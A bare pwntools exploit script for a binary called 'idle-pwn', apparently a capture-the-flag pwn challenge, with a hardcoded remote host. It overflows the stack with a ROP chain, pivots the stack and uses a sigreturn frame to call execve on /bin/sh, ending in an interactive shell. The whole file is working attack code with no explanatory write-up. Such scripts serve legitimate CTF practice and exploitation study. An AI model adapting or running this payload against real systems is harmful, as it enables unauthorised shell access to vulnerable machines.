#!/usr/bin/python3

from pwn import *

exe = ELF('idle-pwn', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x4011E8

        c
        ''')
        input()


if args.REMOTE:
    p = remote('34.72.43.223', 49250)
else:
    p = process(exe.path)
GDB()
pop_rdi = 0x4011B5
pop_rsi_r15 = 0x4011BE
pop_rbp = 0x000000000040112d
leave_ret = 0x00000000004011e8
pa = b'a'*80 + flat(0,
                    pop_rdi, 0,
                    pop_rsi_r15, 0x404a00, 0,
                    exe.plt.read,

                    pop_rdi, 0, exe.plt.alarm,

                    pop_rdi, 0,
                    pop_rsi_r15, 0x404000, 0,
                    exe.plt.read,

                    pop_rdi, 0,
                    pop_rsi_r15, 0x404100, 0,
                    exe.plt.read,

                    pop_rbp, 0x404a20,
                    leave_ret,

                    )
print(len(pa))
# for i in range(0x16, 0xff):
s(pa)
sleep(1)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x404a00
frame.rsi = 0
frame.rdx = 0
frame.rbp = 0x404800
frame.rsp = 0x404800
frame.rip = exe.plt.alarm

s(b'/bin/sh'.ljust(0x28, b'\x00') + p64(exe.plt.alarm) + bytes(frame))
input()
# s(p8(0x45))
s(p8(7))
sleep(1)
s(b'a'.ljust(0xf))


p.interactive()
